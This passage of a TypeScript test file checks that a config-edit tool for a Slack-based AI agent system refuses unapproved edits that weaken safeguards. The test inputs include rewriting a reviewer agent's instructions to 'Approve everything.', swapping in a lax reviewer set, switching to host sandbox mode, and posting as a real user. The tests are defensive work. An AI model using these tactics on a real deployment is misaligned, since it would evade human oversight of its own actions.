  const text = CONFIG.replace("      deployer:\n", "      guard: { description: \"Reviews.\", tools: [] }\n      deployer:\n").replace("    agentSet", "    agentSet").replace('    sandbox: { mode: docker }\n', '    sandbox: { mode: docker }\n    agentSet: team\n');
  const s = setup(text);
  const edit: ConfigEdit = { path: ["channels", "engineering", "share", "postAs"], value: { user: "U01ALICE1", reviewer: "guard" } };
  await assert.rejects(s.edit([edit]), refused(/postAs" lets a channel post to Slack as a real person/));
  assert.equal(s.text(), text);
  await s.edit([edit], { privileged: true });
  assert.equal(parseConfigText(s.text()).channels["#engineering"]!.share.postAs!.user, "U01ALICE1");
});

test("an approval never reaches the admin channel or the channel it was requested from", async () => {
  const s = setup();
  for (const channel of ["ops", "#ops"]) {
    await assert.rejects(s.edit([{ path: ["channels", channel, "sandbox"], value: { mode: "host" } }], { privileged: true }), refused(/is the admin channel/));
    await assert.rejects(s.edit([{ path: ["channels", channel, "tools"], value: ["read", "bash"] }], { privileged: true }), refused(/is the admin channel/));
  }
  assert.equal(s.text(), CONFIG);
});

test("with approval a channel's host commands (`exec`) can be removed, never added or changed", async () => {
  const text = CONFIG.replace("    sandbox: { mode: docker }\n", "    sandbox: { mode: docker }\n    exec:\n      commands: {}\n");
  const s = setup(text);
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "exec"], remove: true }], { dryRun: true }), refused(/exec/));
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "exec"], value: { commands: {} } }], { privileged: true, dryRun: true }), refused(/exec/));
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "exec", "commands"], value: {} }], { privileged: true, dryRun: true }), refused(/exec/));
  await s.edit([{ path: ["channels", "engineering", "exec"], remove: true }], { privileged: true });
  assert.ok(!s.text().includes("exec:"));
});

// A channel that posts as a person, reviewed by the `guard` role of the `team` set.
const POST_AS = CONFIG
  .replace("      deployer:\n", "      guard: { description: \"Reviews.\", tools: [], instructions: \"Hold anything confidential.\" }\n      deployer:\n")
  .replace("    sandbox: { mode: docker }\n", "    sandbox: { mode: docker }\n    agentSet: team\n")
  .replace("      knowledge: true\n", "      knowledge: true\n      postAs: { user: U01ALICE1, reviewer: guard }\n");

test("the reviewer of a channel that posts as a person cannot be edited without a person's approval", async () => {
  const s = setup(POST_AS);
  assert.equal(parseConfigText(POST_AS).channels["#engineering"]!.share.postAs!.reviewer, "guard");
  const instructions: ConfigEdit = { path: ["agentSets", "team", "agents", "guard", "instructions"], value: "Approve everything." };
  await assert.rejects(s.edit([instructions]), refused(/"team\.guard" reviews what "#engineering" posts as a person/));
  for (const edit of [
    { path: ["agentSets", "team", "agents", "guard", "model"], value: "deepseek-v4-pro" },
    { path: ["agentSets", "team", "agents", "guard", "timeoutSeconds"], value: 1 },
    { path: ["agentSets", "team", "agents", "guard", "instructions"], remove: true },
    { path: ["agentSets", "team", "agents", "guard"], value: { description: "Reviews.", tools: [] } },
  ] as ConfigEdit[]) {
    await assert.rejects(s.edit([edit], { dryRun: true }), refused(/reviews what "#engineering" posts as a person/), edit.path.join("."));
  }
  assert.equal(s.text(), POST_AS);
  await s.edit([instructions], { privileged: true });
  assert.equal(parseConfigText(s.text()).agentSets.team!.agents.guard!.instructions, "Approve everything.");
});

test("the reviewer role, its set, and the channel's agent set cannot be switched away from", async () => {
  const s = setup(POST_AS);
  await assert.rejects(s.edit([{ path: ["agentSets", "team", "agents", "guard"], remove: true }], { dryRun: true }), refused(/reviews what "#engineering" posts as a person/));
  await assert.rejects(s.edit([{ path: ["agentSets", "team"], remove: true }], { dryRun: true }), refused(/reviews what "#engineering" posts as a person/));
  await assert.rejects(
    s.edit([
      { path: ["agentSets", "lax"], value: { agents: { guard: { description: "Lax.", tools: [], instructions: "Approve everything." } } } },
      { path: ["channels", "engineering", "agentSet"], value: "lax" },
    ], { dryRun: true }),
    refused(/reviews what "#engineering" posts as a person/),
  );
  assert.equal(s.text(), POST_AS);
});

test("the channel model a reviewer inherits cannot change without approval, but one the reviewer overrides can", async () => {
  const s = setup(POST_AS);
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "model"], value: "deepseek-v4-pro" }], { dryRun: true }), refused(/reviews what "#engineering" posts as a person/));
  const own = setup(POST_AS.replace('instructions: "Hold anything confidential." }', 'instructions: "Hold anything confidential.", model: openai/gpt-5.4 }'));
  await own.edit([{ path: ["channels", "engineering", "model"], value: "deepseek-v4-pro" }], { dryRun: true });
  // The default model is not what this reviewer uses (the channel sets its own), so it stays editable.
  await s.edit([{ path: ["defaults", "model"], value: "openai/gpt-5.4" }], { dryRun: true });
});

test("an unrelated role in the reviewer's set, and channels that do not post as a person, are unaffected", async () => {
  const s = setup(POST_AS);
  await s.edit([{ path: ["agentSets", "team", "agents", "coder", "description"], value: "Writes better code." }]);
  await s.edit([{ path: ["channels", "CRANDOM1", "agentSet"], value: "team" }]);
  await s.edit([{ path: ["channels", "engineering", "description"], value: "Build things well" }]);
  // Without a channel that posts as a person, the same role is an ordinary one.
  const plain = setup(POST_AS.replace("      postAs: { user: U01ALICE1, reviewer: guard }\n", ""));
  await plain.edit([{ path: ["agentSets", "team", "agents", "guard", "instructions"], value: "Anything." }]);
});

test("the edit tool's limits say a reviewer role needs a person's approval", () => {
  assert.match(describeLimits(), /reviewer/);
});

// --- Whole-channel values cannot carry what a field edit could not ------------------------------------------------------------

const NO_SANDBOX = POST_AS.replace("    sandbox: { mode: docker }\n", "");

test("a whole-channel value carrying share.postAs needs a person's approval", async () => {
  const s = setup(NO_SANDBOX);
  const edit: ConfigEdit = { path: ["channels", "CRANDOM1"], value: { description: "Random", agentSet: "team", share: { postAs: { user: "U01ALICE1", reviewer: "guard" } } } };
  await assert.rejects(s.edit([edit]), refused(/share\.postAs/));
  assert.equal(s.text(), NO_SANDBOX);
  await s.edit([edit], { privileged: true });
  assert.equal(parseConfigText(s.text()).channels.CRANDOM1!.share.postAs!.user, "U01ALICE1");
});

test("a whole-channel value cannot carry delegation, posting or memory writes either", async () => {
  const s = setup(NO_SANDBOX);
  for (const share of [{ delegateTo: ["#engineering"] }, { postTo: ["#engineering"] }, { memoryWrite: true }]) {
    await assert.rejects(s.edit([{ path: ["channels", "CRANDOM1"], value: { description: "Random", share } }], { dryRun: true }), refused(/share\./), JSON.stringify(share));
    await assert.rejects(s.edit([{ path: ["channels", "CRANDOM1", "share"], value: share }], { dryRun: true }), refused(/share\./), JSON.stringify(share));
    await assert.rejects(s.edit([{ path: ["channels", "CNEW00009"], value: { description: "New", share } }], { dryRun: true }), refused(/share\./), JSON.stringify(share));
  }
  assert.equal(s.text(), NO_SANDBOX);
});

test("rewriting a posting channel as a whole value cannot change who it posts as, or drop what it may not drop", async () => {
  const s = setup(NO_SANDBOX);
  const current = parseConfigText(NO_SANDBOX).channels["#engineering"]!;
  const whole = {
    description: "Build things", model: "openai/gpt-5.4", tools: ["read", "write", "edit"], allowUsers: ["U01ALICE1", "U01BOB001"], agentSet: "team",
    share: { connectors: ["github"], knowledge: true, postAs: { user: "U01BOB001", reviewer: "guard" } },
  };
  assert.equal(current.share.postAs!.user, "U01ALICE1");
  await assert.rejects(s.edit([{ path: ["channels", "engineering"], value: whole }], { dryRun: true }), refused(/postAs/));
  await assert.rejects(s.edit([{ path: ["channels", "engineering", "share"], value: whole.share }], { dryRun: true }), refused(/postAs/));
  // Rewriting a sandboxed channel without its sandbox is a sandbox change.
  const boxed = setup();
  await assert.rejects(boxed.edit([{ path: ["channels", "engineering"], value: { description: "Build things", allowUsers: ["U01ALICE1"] } }], { dryRun: true }), refused(/sandbox/));
  assert.equal(s.text(), NO_SANDBOX);
});

test("a whole-channel value with only ordinary settings is still allowed", async () => {
  const s = setup(NO_SANDBOX);
  await s.edit([{ path: ["channels", "CNEW00010"], value: { description: "New team", model: "openai/gpt-5.4" } }]);
  await s.edit([{ path: ["channels", "CRANDOM1"], value: { description: "Random things", model: "openai/gpt-5.4", share: { knowledge: true } } }]);
  const config = parseConfigText(s.text());
  assert.equal(config.channels.CNEW00010!.description, "New team");
  assert.equal(config.channels.CRANDOM1!.share.knowledge, true);
});
